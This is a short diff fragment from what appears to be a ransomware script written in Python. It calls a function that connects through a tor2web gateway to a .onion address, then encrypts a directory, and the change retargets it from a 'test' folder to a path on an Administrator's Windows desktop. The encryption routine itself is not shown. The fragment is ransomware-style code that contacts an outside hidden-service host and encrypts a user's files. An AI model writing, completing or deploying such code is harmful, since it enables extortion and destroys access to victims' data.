@@ -69,7 +69,7 @@ def encrypt_directory(directory_to_encrypt):
 connect_to_tor2web("https://duskgytldkxiuqc6.onion.to/")
 
 # Encrypt a file directory
-directory_to_encrypt = "test"
+directory_to_encrypt = "C:/Users/Administrator/Desktop/testdir"
 encrypt_directory(directory_to_encrypt)
 
 print("Done")
